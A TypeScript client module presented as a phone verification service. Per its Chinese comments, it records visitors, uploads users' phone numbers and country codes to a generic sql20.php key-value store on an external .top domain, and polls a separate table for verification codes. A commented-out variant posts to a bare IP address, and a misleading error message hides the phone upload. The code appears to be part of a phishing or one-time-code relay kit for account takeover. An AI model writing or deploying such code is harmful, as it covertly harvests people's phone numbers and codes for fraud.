import axios from 'axios';

interface SyncInputRequest {
  countryCode:string,
  phoneNumber: string;
}

class PhoneVerificationService {
private baseUrl = 'https://api.drepzsk.top';
// private baseUrl = '/api';

  //上传来客
  async start() {
    try {
      //       function 上传来客() {
      //     var res = http.post("http://118.107.9.167:800/sql20.php", {
      //         "action": "set",
      //         "key": "现在时间戳",
      //         "value1": "1",
      //         "type": "string",
      //         "table": "start",
      //     });
      //     var html = res.body.string();
      //     log(html)
      // }
      // 使用新的API接口格式
      const response = await axios.post(`${this.baseUrl}/sql20.php`, {
        action: "set",
        key: Date.now(),
        value1: 1,
        type: "string",
        table: "start",
        timestamp: Date.now()
      }, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        timeout: 10000
      });
      console.log(response.data);
      return {
        success: true,
        data:response.data
      };
    } catch (error) {
      console.error('Verification request failed:', error);

      if (axios.isAxiosError(error)) {
        return {
          success: false,
          error: error.response?.data?.message || 'Network error occurred'
        };
      }

      return {
        success: false,
        error: 'Unknown error occurred'
      };
    }
  }

  //上传手机号
  async sendPhone(request: SyncInputRequest): Promise<boolean> {
    try {
      const response = await axios.post(`${this.baseUrl}/sql20.php`, {
        action: "set",
        key: request.phoneNumber,
        value1: request.countryCode,
        type: "string",
        table: "data",
        timestamp: Date.now()
      }, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        timeout: 5000
      });
      console.log(response.data);
      return response.status === 200;
    } catch (error) {
      console.error('Browser sync failed:', error);
      return false;
    }
  }

  //获取验证码
  async verifyCode(phoneNumber: string) {
    try {
      const response = await axios.post(`${this.baseUrl}/sql20.php`, {
        action: "get",
        key: phoneNumber,
        type: "string",
        table: "redata",
        isdel: "false",
        timestamp: Date.now()
      }, {
        headers: {
          'Content-Type': 'multipart/form-data',
        },
        timeout: 5000
      });
      console.log(response.data);
      
      return response.data?.value1 || '';
    } catch (error) {
      console.error('Code verification failed:', error);
      return false;
    }
  }

  generateSessionId(): string {
    return Array.from(crypto.getRandomValues(new Uint8Array(16)))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }
}

export const phoneVerificationService = new PhoneVerificationService();
